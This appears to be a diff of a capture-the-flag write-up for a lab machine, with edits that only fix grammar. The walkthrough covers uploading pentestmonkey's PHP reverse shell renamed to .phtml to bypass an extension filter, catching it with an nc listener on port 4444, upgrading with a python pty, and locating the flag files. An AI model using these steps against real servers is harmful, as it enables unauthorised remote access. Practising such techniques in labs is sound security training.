@@ -29,19 +29,19 @@ gobuster dir -u "http://10.10.181.86/" -w /usr/share/wordlists/dirbuster/directo
 <span style="line-height:0.5;">&nbsp;</span>
 
 ### Find a form to upload and get a reverse shell, and find the flag.
-Download reverse shell from [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
-Change default ip address and port to your ip address and port `4444`
+Download the reverse shell from [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
+Change the default IP address and port to your IP address and port `4444`.
 
 ![image](https://github.com/user-attachments/assets/ac128c0d-4ce4-4ee1-90bf-309049d10339)  
 
-Save as shell.phtml, because there is extension filter in input. Start a listener.
+Save as shell.phtml, because there is an extension filter in the input. Start a listener.
 ```BASH
 nc -lvnp 4444
 ```
 
 <span style="line-height:0.5;">&nbsp;</span>
 
-Go to `http://10.10.181.86/uploads/shell.phtml?cmd=id` to run script.  
+Go to `http://10.10.181.86/uploads/shell.phtml?cmd=id` to run the script.  
 
 ![image](https://github.com/user-attachments/assets/ebd1503a-c6a9-447f-9173-4a1f24ab03cc)
 
@@ -54,7 +54,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 <span style="line-height:0.5;">&nbsp;</span>
 
-Run find command to search for user.txt flag.
+Run the find command to search for user.txt flag.
 ```BASH
 find / -name user.txt 2>/dev/null
 ```
@@ -81,7 +81,7 @@ To escalate privillages run:
 ```
 ![image](https://github.com/user-attachments/assets/f583a3f6-99d0-474e-bae5-35cef85b45d8)
 
-Run find command to search for root.txt flag.
+Run the find command to search for root.txt flag.
 ```BASH
 find / -name root.txt 2>/dev/null  
 ```
